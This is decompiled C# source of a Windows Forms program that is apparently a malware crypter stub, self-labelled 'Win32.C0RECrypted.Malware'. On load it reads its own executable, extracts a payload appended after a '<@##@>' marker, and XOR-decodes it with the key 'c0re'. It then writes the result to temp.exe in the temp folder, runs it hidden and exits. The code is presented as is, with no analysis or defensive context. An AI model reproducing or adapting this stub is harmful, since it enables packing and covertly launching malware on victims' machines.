using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsApplication1;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("sFile")]
	private TextBox _sFile;

	private string virussignature;

	private const string FileSplit = "<@##@>";

	internal virtual TextBox sFile
	{
		[DebuggerNonUserCode]
		get
		{
			return _sFile;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_sFile = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		virussignature = "Win32.C0RECrypted.Malware";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		sFile = new TextBox();
		((Control)this).SuspendLayout();
		TextBox obj = sFile;
		Point location = new Point(25, 99);
		((Control)obj).set_Location(location);
		((Control)sFile).set_Name("sFile");
		TextBox obj2 = sFile;
		Size size = new Size(129, 20);
		((Control)obj2).set_Size(size);
		((Control)sFile).set_TabIndex(0);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(284, 264);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)sFile);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long ShellExecuteA(long hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpOperation, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFile, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpParameters, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpDirectory, long nShowCmd);

	private void Form1_Load(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string dataIn = default(string);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 317:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_000c;
						case 4:
							goto IL_001f;
						case 5:
							goto IL_002f;
						case 6:
							goto IL_0044;
						case 7:
							goto IL_005b;
						case 8:
							goto IL_006e;
						case 9:
							goto IL_0071;
						case 10:
							goto IL_0094;
						case 11:
							goto IL_00b4;
						case 12:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 13:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00b4:
					num = 11;
					FileSystem.FileClose(new int[1] { 1 });
					break;
					IL_0094:
					num = 10;
					FileSystem.FilePut(1, XOREncryption(dataIn, "c0re"), -1L, false);
					goto IL_00b4;
					IL_0009:
					num = 2;
					goto IL_000c;
					IL_000c:
					num = 3;
					FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
					goto IL_001f;
					IL_001f:
					num = 4;
					text = Strings.Space(checked((int)FileSystem.LOF(1)));
					goto IL_002f;
					IL_002f:
					num = 5;
					FileSystem.FileGet(1, ref text, -1L, false);
					goto IL_0044;
					IL_0044:
					num = 6;
					FileSystem.FileClose(new int[1] { 1 });
					goto IL_005b;
					IL_005b:
					num = 7;
					dataIn = Strings.Split(text, "<@##@>", -1, (CompareMethod)0)[1];
					goto IL_006e;
					IL_006e:
					num = 8;
					goto IL_0071;
					IL_0071:
					num = 9;
					FileSystem.FileOpen(1, Interaction.Environ("tmp") + "\\temp.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
					goto IL_0094;
					end_IL_0000_2:
					break;
				}
				num = 12;
				Interaction.Shell(Interaction.Environ("tmp") + "\\temp.exe", (AppWinStyle)0, false, -1);
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 317;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public string XOREncryption(string DataIn, string CodeKey)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		long num5 = default(long);
		string text = default(string);
		int num6 = default(int);
		int num7 = default(int);
		long num8 = default(long);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0009;
					case 195:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0000;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0009;
							case 3:
								goto IL_000c;
							case 4:
								goto IL_0024;
							case 5:
								goto IL_0036;
							case 6:
								goto IL_005a;
							case 7:
								goto IL_0071;
							case 8:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 9:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_0071:
						num = 7;
						num5++;
						goto IL_0080;
						IL_005a:
						num = 6;
						text += Conversions.ToString(Strings.Chr(num6 ^ num7));
						goto IL_0071;
						IL_0009:
						num = 2;
						goto IL_000c;
						IL_000c:
						num = 3;
						num8 = Strings.Len(DataIn);
						num5 = 1L;
						goto IL_0080;
						IL_0080:
						if (num5 > num8)
						{
							break;
						}
						goto IL_0024;
						IL_0024:
						num = 4;
						num6 = Strings.Asc(Strings.Mid(DataIn, (int)num5, 1));
						goto IL_0036;
						IL_0036:
						num = 5;
						num7 = Strings.Asc(Strings.Mid(CodeKey, (int)(unchecked(num5 % Strings.Len(CodeKey)) + 1L), 1));
						goto IL_005a;
						end_IL_0000_2:
						break;
					}
					num = 8;
					text2 = text;
					break;
				}
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 195;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text2;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}
}
